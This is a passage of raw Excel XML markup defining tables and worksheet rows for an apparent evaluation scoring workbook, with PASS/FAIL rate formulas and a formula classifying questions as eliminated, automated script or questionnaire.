      <calculatedColumnFormula>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="10" xr3:uid="{982D0809-3D70-E24D-8E36-DDD923C1B2E7}" name="PASS rate" dataDxfId="74" dataCellStyle="Percent">
      <calculatedColumnFormula>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="16" xr3:uid="{B868A9EC-C31C-0146-A2A3-E1F6F93AE5DF}" name="FAIL Rate" dataDxfId="73" dataCellStyle="Percent">
      <calculatedColumnFormula>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="19" xr3:uid="{72795D3D-1DCF-9E4C-9F31-53CC850DCBC8}" name="N/A Rate" dataDxfId="72" dataCellStyle="Percent">
      <calculatedColumnFormula>Table4123[[#This Row],[Total N/A Responses]]/5</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2368DE-65FF-294F-9E93-5DAEB40675D0}" name="Table4" displayName="Table4" ref="A1:H20" totalsRowShown="0" headerRowDxfId="71" dataDxfId="69" headerRowBorderDxfId="70" tableBorderDxfId="68" totalsRowBorderDxfId="67" headerRowCellStyle="Normal" dataCellStyle="Normal">
  <autoFilter ref="A1:H20" xr:uid="{962368DE-65FF-294F-9E93-5DAEB40675D0}"/>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:G20">
    <sortCondition ref="B1:B20"/>
  </sortState>
  <tableColumns count="8">
    <tableColumn id="1" xr3:uid="{80FC212E-C2BC-AE4B-A2CB-53EFD45F0061}" name="Scoring Category" dataDxfId="66" dataCellStyle="Normal"/>
    <tableColumn id="2" xr3:uid="{E2FB3857-5149-1A49-9C88-39ADE065765B}" name="ID" dataDxfId="65" dataCellStyle="Normal"/>
    <tableColumn id="3" xr3:uid="{BAEC4A71-0A98-CE46-A71B-009C986A775F}" name="Evaluation Question" dataDxfId="64" dataCellStyle="Normal"/>
    <tableColumn id="10" xr3:uid="{F955C2D7-E305-7F4E-9A49-2EF3712D53B7}" name="Authoritative Data Sources (Scoring Aid)" dataDxfId="63" dataCellStyle="Normal"/>
    <tableColumn id="12" xr3:uid="{7BED2E30-AF5D-8340-B122-56FF7CE85D88}" name="Evaluation Steps (Scoring Aid)" dataDxfId="62" dataCellStyle="Normal"/>
    <tableColumn id="13" xr3:uid="{420558AF-9351-E547-90DD-FFE437DAAF75}" name="Evaluator Determination" dataDxfId="61" dataCellStyle="Normal"/>
    <tableColumn id="14" xr3:uid="{6EC797BD-2C0C-2349-B788-B1C19C9ADAE1}" name="Notes/Comments On Scoring" dataDxfId="60" dataCellStyle="Normal"/>
    <tableColumn id="17" xr3:uid="{ABBE8674-4830-4643-9D1B-A0C08CC11D31}" name="Notes/Comments on Question" dataDxfId="59" dataCellStyle="Normal"/>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8D623C-FBAA-467B-821C-FB825EC06204}" name="Table413" displayName="Table413" ref="A1:I10" totalsRowShown="0" headerRowDxfId="58" dataDxfId="56" headerRowBorderDxfId="57" tableBorderDxfId="55" totalsRowBorderDxfId="54" headerRowCellStyle="Normal" dataCellStyle="Normal">
  <autoFilter ref="A1:I10" xr:uid="{962368DE-65FF-294F-9E93-5DAEB40675D0}"/>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:H10">
    <sortCondition ref="B1:B10"/>
  </sortState>
  <tableColumns count="9">
    <tableColumn id="1" xr3:uid="{516C31FA-95C3-426A-9143-A3B2092A9062}" name="Scoring Category" dataDxfId="53" dataCellStyle="Normal"/>
    <tableColumn id="2" xr3:uid="{79990EC8-6E87-4349-A0D4-CC1A56B0D2EC}" name="ID" dataDxfId="52" dataCellStyle="Normal"/>
    <tableColumn id="3" xr3:uid="{B33138EE-9C1A-4116-B781-9F0B3B15B3FA}" name="Evaluation Question" dataDxfId="51" dataCellStyle="Normal"/>
    <tableColumn id="10" xr3:uid="{6C91751B-E0AC-487F-9895-64DDD33BC24F}" name="Authoritative Data Sources (Scoring Aid)" dataDxfId="50" dataCellStyle="Normal"/>
    <tableColumn id="12" xr3:uid="{B93B36F8-E2AA-49EF-ABDD-9EE19D26AE35}" name="Evaluation Steps (Scoring Aid)" dataDxfId="49" dataCellStyle="Normal"/>
    <tableColumn id="4" xr3:uid="{796674A6-3087-8E4E-8C15-0777BB814322}" name="Step or Plan-level evaluation" dataDxfId="48"/>
    <tableColumn id="13" xr3:uid="{79E10CED-F7A0-4583-AF6A-B82F92D99914}" name="Evaluator Determination" dataDxfId="47" dataCellStyle="Normal"/>
    <tableColumn id="14" xr3:uid="{0F471FED-DD02-4BEE-B899-2FE902544887}" name="Notes/Comments On Scoring" dataDxfId="46" dataCellStyle="Normal"/>
    <tableColumn id="17" xr3:uid="{82F1FB9F-3F4F-4870-A66A-BF9016678A51}" name="Notes/Comments on Question" dataDxfId="45" dataCellStyle="Normal"/>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24E8D8-4314-9C42-BA3B-02CA563F5937}" name="Table46" displayName="Table46" ref="A1:I20" totalsRowShown="0" headerRowDxfId="44" dataDxfId="42" headerRowBorderDxfId="43" tableBorderDxfId="41" totalsRowBorderDxfId="40" headerRowCellStyle="Normal" dataCellStyle="Normal">
  <autoFilter ref="A1:I20" xr:uid="{962368DE-65FF-294F-9E93-5DAEB40675D0}">
    <filterColumn colId="5">
      <colorFilter dxfId="39"/>
    </filterColumn>
  </autoFilter>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A3:I17">
    <sortCondition ref="B1:B20"/>
  </sortState>
  <tableColumns count="9">
    <tableColumn id="1" xr3:uid="{867D30B9-DE91-D94C-A4FC-B10E9429EC26}" name="Scoring Category" dataDxfId="38" dataCellStyle="Normal"/>
    <tableColumn id="2" xr3:uid="{20561D47-80DC-F641-8D54-D2FD0823CCE1}" name="ID" dataDxfId="37" dataCellStyle="Normal"/>
    <tableColumn id="3" xr3:uid="{B93369F3-CF03-2A46-BCB3-9F3D8A7529D1}" name="Evaluation Question" dataDxfId="36" dataCellStyle="Normal"/>
    <tableColumn id="10" xr3:uid="{D0CB1195-B955-C349-BDB1-8C352789732E}" name="Authoritative Data Sources (Scoring Aid)" dataDxfId="35" dataCellStyle="Normal"/>
    <tableColumn id="12" xr3:uid="{625395FC-E506-7A4F-BBC3-507CC60D0566}" name="Evaluation Steps (Scoring Aid)" dataDxfId="34" dataCellStyle="Normal"/>
    <tableColumn id="13" xr3:uid="{CF6D82A2-E476-3F47-A2B8-5C1F18980D02}" name="Evaluator Determination (TRUE = PASS)" dataDxfId="33" dataCellStyle="Normal"/>
    <tableColumn id="14" xr3:uid="{3BEAF569-7207-184B-9D20-CDA97B4F0121}" name="Notes/Comments On Scoring" dataDxfId="32" dataCellStyle="Normal"/>
    <tableColumn id="17" xr3:uid="{DCC46C23-8640-2D49-B00B-5B17BBE81CE4}" name="Notes/Comments on Question" dataDxfId="31" dataCellStyle="Normal"/>
    <tableColumn id="18" xr3:uid="{AB3F6626-8E52-D34E-8FDB-BF33A9B52575}" name="Column1" dataDxfId="30" dataCellStyle="Normal"/>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AA9F85-C5E1-4992-96DA-7E434367215F}" name="Table47" displayName="Table47" ref="A1:H20" totalsRowShown="0" headerRowDxfId="29" dataDxfId="27" headerRowBorderDxfId="28" tableBorderDxfId="26" totalsRowBorderDxfId="25" headerRowCellStyle="Normal" dataCellStyle="Normal">
  <autoFilter ref="A1:H20" xr:uid="{962368DE-65FF-294F-9E93-5DAEB40675D0}">
    <filterColumn colId="5">
      <colorFilter dxfId="24"/>
    </filterColumn>
  </autoFilter>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:H20">
    <sortCondition ref="B1:B20"/>
  </sortState>
  <tableColumns count="8">
    <tableColumn id="1" xr3:uid="{096CE192-DD91-4808-A6DC-632748D04D32}" name="Scoring Category" dataDxfId="23" dataCellStyle="Normal"/>
    <tableColumn id="2" xr3:uid="{205D9C40-8B2F-4CDC-B292-96098258ECFB}" name="ID" dataDxfId="22" dataCellStyle="Normal"/>
    <tableColumn id="3" xr3:uid="{BB6DD760-A753-4BAA-A119-4CA420013C85}" name="Evaluation Question" dataDxfId="21" dataCellStyle="Normal"/>
    <tableColumn id="10" xr3:uid="{4F2CBD37-44BD-4796-AEA2-046949EF7DEB}" name="Authoritative Data Sources (Scoring Aid)" dataDxfId="20" dataCellStyle="Normal"/>
    <tableColumn id="12" xr3:uid="{4CA5B12D-7831-47F7-90A5-3170CA274AFB}" name="Evaluation Steps (Scoring Aid)" dataDxfId="19" dataCellStyle="Normal"/>
    <tableColumn id="13" xr3:uid="{9E9F93A5-0424-4463-9DD4-F19E87864135}" name="Evaluator Determination (TRUE = PASS)" dataDxfId="18" dataCellStyle="Normal"/>
    <tableColumn id="14" xr3:uid="{E3D6E70F-9374-4776-BC58-EA698CFD998B}" name="Notes/Comments On Scoring" dataDxfId="17" dataCellStyle="Normal"/>
    <tableColumn id="17" xr3:uid="{ADA91732-6A43-4CAB-816C-D6A623DAE449}" name="Notes/Comments on Question" dataDxfId="16" dataCellStyle="Normal"/>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85883D-9C83-F34D-B2A8-642A103794B5}" name="Table8" displayName="Table8" ref="A1:G20" totalsRowShown="0" headerRowDxfId="128" dataDxfId="127">
  <autoFilter ref="A1:G20" xr:uid="{8C85883D-9C83-F34D-B2A8-642A103794B5}">
    <filterColumn colId="5">
      <filters>
        <filter val="TRUE"/>
      </filters>
    </filterColumn>
  </autoFilter>
  <tableColumns count="7">
    <tableColumn id="1" xr3:uid="{F2D65685-0C8E-2345-B509-6C9C40A38119}" name="Scoring Category" dataDxfId="126"/>
    <tableColumn id="2" xr3:uid="{0570071D-58AB-0446-9AC1-1CA86E89A12E}" name="ID" dataDxfId="125"/>
    <tableColumn id="3" xr3:uid="{C3EE01AC-0075-4D47-B59C-6A57C106838E}" name="Evaluation Question" dataDxfId="124"/>
    <tableColumn id="4" xr3:uid="{B355C69A-6D8D-E54E-9E5F-111986E6F2BA}" name="Authoritative Data Sources (Scoring Aid)" dataDxfId="123"/>
    <tableColumn id="5" xr3:uid="{1C2C1C09-42DD-2F46-8084-47467067700D}" name="Evaluation Steps (Scoring Aid)" dataDxfId="122"/>
    <tableColumn id="6" xr3:uid="{47797140-B6A3-9E46-8FD4-58BB8A0A5D91}" name="Evaluator Determination (TRUE = PASS)" dataDxfId="121"/>
    <tableColumn id="7" xr3:uid="{2BD8D5E9-0C2E-D34A-A547-27B1AD0CC01D}" name="Notes/Comments On Scoring" dataDxfId="12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2B9E3A-3F3B-D145-9FA9-0DA3F5A93608}" name="Table7" displayName="Table7" ref="A1:H20" totalsRowShown="0" headerRowDxfId="15" dataDxfId="13" headerRowBorderDxfId="14" tableBorderDxfId="12" totalsRowBorderDxfId="11">
  <autoFilter ref="A1:H20" xr:uid="{D52B9E3A-3F3B-D145-9FA9-0DA3F5A93608}">
    <filterColumn colId="5">
      <filters>
        <filter val="maybe; see comment on 2.2"/>
        <filter val="no"/>
        <filter val="Yes"/>
        <filter val="yes?"/>
      </filters>
    </filterColumn>
  </autoFilter>
  <tableColumns count="8">
    <tableColumn id="1" xr3:uid="{4959771A-484F-E14B-ACB0-524D7C8C93E4}" name="Scoring Category" dataDxfId="10"/>
    <tableColumn id="2" xr3:uid="{60750BD0-D0DC-E043-B367-78CF289C0E9E}" name="ID" dataDxfId="9"/>
    <tableColumn id="3" xr3:uid="{1638D2E7-9171-D54B-B1D6-D0212B30855B}" name="Evaluation Question" dataDxfId="8"/>
    <tableColumn id="4" xr3:uid="{4C0D4FA4-1B9A-0849-B2F4-2958C7892776}" name="Authoritative Data Sources (Scoring Aid)" dataDxfId="7"/>
    <tableColumn id="5" xr3:uid="{D18AE26A-DE92-F94D-99E7-491AB8F25022}" name="Evaluation Steps (Scoring Aid)" dataDxfId="6"/>
    <tableColumn id="6" xr3:uid="{D6F6D86E-C5C3-3345-999D-0E6ADBD68120}" name="Evaluator Determination" dataDxfId="5"/>
    <tableColumn id="7" xr3:uid="{D40F04F1-FEFA-4047-91FF-52E43A8AEE7F}" name="Notes/Comments on Scoring" dataDxfId="4"/>
    <tableColumn id="8" xr3:uid="{0E450E06-B890-B642-AFB2-9F534209FD06}" name="Notes/Comments on Question" dataDxfId="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71A0B-181D-774E-B41C-7E9C2C18EC8F}">
  <dimension ref="A1:K69"/>
  <sheetViews>
    <sheetView zoomScaleNormal="120" workbookViewId="0">
      <pane xSplit="2" ySplit="1" topLeftCell="C2" activePane="bottomRight" state="frozen"/>
      <selection pane="topRight" activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="A2" sqref="A2"/>
      <selection pane="bottomRight" activeCell="E40" sqref="E40"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="22.6640625" defaultRowHeight="14.4"/>
  <cols>
    <col min="1" max="1" width="39.6640625" style="1" customWidth="1"/>
    <col min="2" max="2" width="6.88671875" style="4" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="25.6640625" style="1" customWidth="1"/>
    <col min="4" max="4" width="17.109375" style="1" customWidth="1"/>
    <col min="5" max="5" width="18.88671875" style="1" customWidth="1"/>
    <col min="6" max="6" width="20.109375" style="1" customWidth="1"/>
    <col min="7" max="7" width="22.6640625" style="1" bestFit="1" customWidth="1"/>
    <col min="8" max="8" width="15.33203125" style="1" customWidth="1"/>
    <col min="9" max="9" width="57.33203125" style="1" customWidth="1"/>
    <col min="10" max="10" width="52.6640625" style="1" customWidth="1"/>
    <col min="11" max="16384" width="22.6640625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" ht="72">
      <c r="A1" s="1" t="s">
        <v>2</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="C1" s="1" t="s">
        <v>0</v>
      </c>
      <c r="D1" s="33" t="s">
        <v>219</v>
      </c>
      <c r="E1" s="33" t="s">
        <v>220</v>
      </c>
      <c r="F1" s="1" t="s">
        <v>218</v>
      </c>
      <c r="G1" s="1" t="s">
        <v>258</v>
      </c>
      <c r="H1" s="1" t="s">
        <v>3</v>
      </c>
      <c r="I1" s="1" t="s">
        <v>259</v>
      </c>
      <c r="J1" s="1" t="s">
        <v>213</v>
      </c>
      <c r="K1" s="1" t="s">
        <v>223</v>
      </c>
    </row>
    <row r="2" spans="1:11" s="2" customFormat="1" ht="144">
      <c r="A2" s="2" t="s">
        <v>46</v>
      </c>
      <c r="B2" s="5">
        <v>1.1000000000000001</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>4</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>211</v>
      </c>
      <c r="F2" s="3" t="str">
        <f t="shared" ref="F2:F11" si="0">IF(OR(D2="Yes",E2="Yes"),"Eliminated", IF(OR(D2="Automated",E2="Automated"),"Automated Script", IF(AND(D2="No",E2="No"),"Questionnaire","")))</f>
        <v>Automated Script</v>
      </c>
      <c r="G2" s="11" t="s">
        <v>284</v>
      </c>
      <c r="H2" s="11"/>
      <c r="I2" s="3" t="s">
        <v>260</v>
      </c>
      <c r="J2" s="3"/>
      <c r="K2" s="11" t="s">
        <v>271</v>
      </c>
    </row>
    <row r="3" spans="1:11" s="2" customFormat="1" ht="100.8">
      <c r="A3" s="2" t="s">
        <v>47</v>
      </c>
      <c r="B3" s="5">
        <v>1.2</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>4</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E3" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F3" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Questionnaire</v>
      </c>
      <c r="G3" s="11"/>
      <c r="H3" s="11"/>
      <c r="I3" s="3"/>
      <c r="K3" s="2" t="s">
        <v>272</v>
      </c>
    </row>
    <row r="4" spans="1:11" s="2" customFormat="1" ht="115.2">
      <c r="A4" s="2" t="s">
        <v>48</v>
      </c>
      <c r="B4" s="5">
        <v>1.3</v>
      </c>
      <c r="C4" s="2" t="s">
        <v>4</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E4" s="2" t="s">
        <v>6</v>
      </c>
      <c r="F4" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Eliminated</v>
      </c>
      <c r="G4" s="11"/>
      <c r="H4" s="11"/>
      <c r="I4" s="3"/>
      <c r="J4" s="2" t="s">
        <v>226</v>
      </c>
      <c r="K4" s="2" t="s">
        <v>227</v>
      </c>
    </row>
    <row r="5" spans="1:11" s="2" customFormat="1" ht="57.6">
      <c r="A5" s="2" t="s">
        <v>5</v>
      </c>
      <c r="B5" s="5">
        <v>1.4</v>
      </c>
      <c r="C5" s="2" t="s">
        <v>4</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E5" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F5" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Automated Script</v>
      </c>
      <c r="G5" s="11"/>
      <c r="H5" s="11"/>
      <c r="I5" s="3" t="s">
        <v>261</v>
      </c>
      <c r="K5" s="2" t="s">
        <v>273</v>
      </c>
    </row>
    <row r="6" spans="1:11" s="2" customFormat="1" ht="57.6">
      <c r="A6" s="2" t="s">
        <v>7</v>
      </c>
      <c r="B6" s="5">
        <v>1.5</v>
      </c>
      <c r="C6" s="2" t="s">
        <v>4</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E6" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F6" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Automated Script</v>
      </c>
      <c r="G6" s="11"/>
      <c r="H6" s="11"/>
      <c r="I6" s="3" t="s">
        <v>262</v>
      </c>
      <c r="K6" s="2" t="s">
        <v>274</v>
      </c>
    </row>
    <row r="7" spans="1:11" s="2" customFormat="1" ht="129.6">
      <c r="A7" s="2" t="s">
        <v>49</v>
      </c>
      <c r="B7" s="5">
        <v>1.6</v>
      </c>
      <c r="C7" s="2" t="s">
        <v>4</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E7" s="2" t="s">
        <v>6</v>
      </c>
      <c r="F7" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Eliminated</v>
      </c>
      <c r="G7" s="11"/>
      <c r="H7" s="11"/>
      <c r="I7" s="3"/>
      <c r="J7" s="2" t="s">
        <v>228</v>
      </c>
      <c r="K7" s="2" t="s">
        <v>229</v>
      </c>
    </row>
    <row r="8" spans="1:11" s="2" customFormat="1" ht="129.6">
      <c r="A8" s="2" t="s">
        <v>51</v>
      </c>
      <c r="B8" s="5">
        <v>1.7</v>
      </c>
      <c r="C8" s="2" t="s">
        <v>4</v>
      </c>
      <c r="D8" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E8" s="2" t="s">
        <v>211</v>
      </c>
      <c r="F8" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Automated Script</v>
      </c>
      <c r="G8" s="11"/>
      <c r="H8" s="11"/>
      <c r="I8" s="3" t="s">
        <v>263</v>
      </c>
      <c r="K8" s="2" t="s">
        <v>276</v>
      </c>
    </row>
    <row r="9" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A9" s="2" t="s">
        <v>216</v>
      </c>
      <c r="B9" s="5">
        <v>2.1</v>
      </c>
      <c r="C9" s="2" t="s">
        <v>10</v>
      </c>
      <c r="D9" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E9" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F9" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Questionnaire</v>
      </c>
      <c r="G9" s="11"/>
      <c r="H9" s="11"/>
      <c r="I9" s="3"/>
    </row>
    <row r="10" spans="1:11" s="2" customFormat="1" ht="57.6">
      <c r="A10" s="2" t="s">
        <v>217</v>
      </c>
      <c r="B10" s="5">
        <v>2.2000000000000002</v>
      </c>
      <c r="C10" s="2" t="s">
        <v>10</v>
      </c>
      <c r="D10" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E10" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F10" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Questionnaire</v>
      </c>
      <c r="G10" s="11"/>
      <c r="H10" s="11"/>
      <c r="I10" s="3"/>
      <c r="K10" s="2" t="s">
        <v>275</v>
      </c>
    </row>
    <row r="11" spans="1:11" s="2" customFormat="1" ht="28.8">
      <c r="A11" s="2" t="s">
        <v>34</v>
      </c>
      <c r="B11" s="5">
        <v>2.2999999999999998</v>
      </c>
      <c r="C11" s="2" t="s">
        <v>10</v>
      </c>
      <c r="D11" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E11" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F11" s="3" t="str">
        <f t="shared" si="0"/>
        <v>Questionnaire</v>
      </c>
      <c r="G11" s="11"/>
      <c r="H11" s="11"/>
      <c r="I11" s="3"/>
    </row>
    <row r="12" spans="1:11" s="2" customFormat="1" ht="115.2">
      <c r="A12" s="2" t="s">
        <v>11</v>
      </c>
      <c r="B12" s="5">
        <v>2.4</v>
      </c>
      <c r="C12" s="2" t="s">
        <v>10</v>
      </c>
      <c r="D12" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E12" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F12" s="3" t="s">
        <v>65</v>
      </c>
      <c r="G12" s="11"/>
      <c r="H12" s="11"/>
      <c r="I12" s="3"/>
      <c r="K12" s="2" t="s">
        <v>222</v>
      </c>
    </row>
    <row r="13" spans="1:11" s="2" customFormat="1" ht="129.6">
      <c r="A13" s="2" t="s">
        <v>56</v>
      </c>
      <c r="B13" s="5">
        <v>2.5</v>
      </c>
      <c r="C13" s="2" t="s">
        <v>10</v>
      </c>
      <c r="D13" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E13" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F13" s="3" t="str">
        <f t="shared" ref="F13:F41" si="1">IF(OR(D13="Yes",E13="Yes"),"Eliminated", IF(OR(D13="Automated",E13="Automated"),"Automated Script", IF(AND(D13="No",E13="No"),"Questionnaire","")))</f>
        <v>Questionnaire</v>
      </c>
      <c r="G13" s="11"/>
      <c r="H13" s="11"/>
      <c r="I13" s="3"/>
      <c r="K13" s="2" t="s">
        <v>277</v>
      </c>
    </row>
    <row r="14" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A14" s="5" t="s">
        <v>57</v>
      </c>
      <c r="B14" s="5">
        <v>2.5</v>
      </c>
      <c r="C14" s="2" t="s">
        <v>10</v>
      </c>
      <c r="D14" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E14" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F14" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G14" s="11"/>
      <c r="H14" s="11"/>
      <c r="I14" s="3"/>
      <c r="J14" s="2" t="s">
        <v>230</v>
      </c>
    </row>
    <row r="15" spans="1:11" customFormat="1" ht="43.2">
      <c r="A15" s="5" t="s">
        <v>9</v>
      </c>
      <c r="B15" s="5" t="s">
        <v>237</v>
      </c>
      <c r="C15" s="2" t="s">
        <v>8</v>
      </c>
      <c r="D15" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E15" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F15" s="34" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G15" s="11"/>
      <c r="H15" s="11"/>
      <c r="I15" s="3"/>
      <c r="J15" s="2" t="s">
        <v>224</v>
      </c>
      <c r="K15" s="2" t="s">
        <v>221</v>
      </c>
    </row>
    <row r="16" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A16" s="5" t="s">
        <v>27</v>
      </c>
      <c r="B16" s="5" t="s">
        <v>238</v>
      </c>
      <c r="C16" s="2" t="s">
        <v>8</v>
      </c>
      <c r="D16" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E16" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F16" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G16" s="11"/>
      <c r="H16" s="11"/>
      <c r="I16" s="3"/>
      <c r="J16" s="2" t="s">
        <v>224</v>
      </c>
    </row>
    <row r="17" spans="1:11" s="2" customFormat="1" ht="57.6">
      <c r="A17" s="5" t="s">
        <v>53</v>
      </c>
      <c r="B17" s="5" t="s">
        <v>239</v>
      </c>
      <c r="C17" s="2" t="s">
        <v>8</v>
      </c>
      <c r="D17" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E17" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F17" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G17" s="11"/>
      <c r="H17" s="11"/>
      <c r="I17" s="3"/>
      <c r="J17" s="2" t="s">
        <v>231</v>
      </c>
    </row>
    <row r="18" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A18" s="5" t="s">
        <v>54</v>
      </c>
      <c r="B18" s="5" t="s">
        <v>240</v>
      </c>
      <c r="C18" s="2" t="s">
        <v>8</v>
      </c>
      <c r="D18" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E18" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F18" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G18" s="11"/>
      <c r="H18" s="11"/>
      <c r="I18" s="3"/>
      <c r="J18" s="2" t="s">
        <v>232</v>
      </c>
    </row>
    <row r="19" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A19" s="2" t="s">
        <v>30</v>
      </c>
      <c r="B19" s="5" t="s">
        <v>241</v>
      </c>
      <c r="C19" s="2" t="s">
        <v>8</v>
      </c>
      <c r="D19" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E19" s="2" t="s">
        <v>6</v>
      </c>
      <c r="F19" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G19" s="11"/>
      <c r="H19" s="11"/>
      <c r="I19" s="3"/>
      <c r="J19" s="2" t="s">
        <v>224</v>
      </c>
    </row>
    <row r="20" spans="1:11" s="2" customFormat="1" ht="86.4">
      <c r="A20" s="5" t="s">
        <v>55</v>
      </c>
      <c r="B20" s="5" t="s">
        <v>242</v>
      </c>
      <c r="C20" s="2" t="s">
        <v>8</v>
      </c>
      <c r="D20" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E20" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F20" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G20" s="11"/>
      <c r="H20" s="11"/>
      <c r="I20" s="3"/>
      <c r="J20" s="2" t="s">
        <v>278</v>
      </c>
    </row>
    <row r="21" spans="1:11" s="2" customFormat="1" ht="28.8">
      <c r="A21" s="2" t="s">
        <v>70</v>
      </c>
      <c r="B21" s="5" t="s">
        <v>243</v>
      </c>
      <c r="C21" s="2" t="s">
        <v>12</v>
      </c>
      <c r="D21" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E21" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F21" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Automated Script</v>
      </c>
      <c r="G21" s="11"/>
      <c r="H21" s="11"/>
      <c r="I21" s="3" t="s">
        <v>264</v>
      </c>
      <c r="K21" s="2" t="s">
        <v>221</v>
      </c>
    </row>
    <row r="22" spans="1:11" s="2" customFormat="1" ht="28.8">
      <c r="A22" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B22" s="5" t="s">
        <v>244</v>
      </c>
      <c r="C22" s="2" t="s">
        <v>12</v>
      </c>
      <c r="D22" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E22" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F22" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Automated Script</v>
      </c>
      <c r="G22" s="11"/>
      <c r="H22" s="11"/>
      <c r="I22" s="3" t="s">
        <v>265</v>
      </c>
    </row>
    <row r="23" spans="1:11" s="2" customFormat="1" ht="28.8">
      <c r="A23" s="2" t="s">
        <v>13</v>
      </c>
      <c r="B23" s="5" t="s">
        <v>245</v>
      </c>
      <c r="C23" s="2" t="s">
        <v>12</v>
      </c>
      <c r="D23" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E23" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F23" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Automated Script</v>
      </c>
      <c r="G23" s="11"/>
      <c r="H23" s="11"/>
      <c r="I23" s="3" t="s">
        <v>266</v>
      </c>
    </row>
    <row r="24" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A24" s="2" t="s">
        <v>37</v>
      </c>
      <c r="B24" s="5" t="s">
        <v>246</v>
      </c>
